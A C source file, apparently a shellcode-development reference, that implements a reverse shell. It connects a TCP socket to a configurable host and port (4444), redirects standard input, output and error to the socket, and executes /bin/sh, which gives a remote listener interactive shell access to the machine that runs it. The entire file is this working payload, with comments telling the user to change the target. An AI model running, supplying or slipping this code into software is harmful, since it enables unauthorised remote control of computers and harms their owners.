#include <stdio.h>
#include <netinet/in.h>

// change the trget here
#define TARGET "127.0.0.1"
// Change the correct port here
#define PORT 4444

int main(int argc, char **argv)
{	
	// sys_socket()	
	int reverse_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	// sys_connect()
	struct sockaddr_in address;
	
	address.sin_addr.s_addr = inet_addr(TARGET);
	address.sin_port = htons(PORT);
	address.sin_family = AF_INET;

	connect(reverse_socket,(struct sockaddr *)&address, sizeof(address));

	
	// sys_dup2()
	dup2(reverse_socket,2);	// STDERR
	dup2(reverse_socket,1);	// STDOUT
	dup2(reverse_socket,0);	// STDIN
	
	// sys_execve()
	execve("/bin/sh",NULL,NULL);
	
	return 0;
}
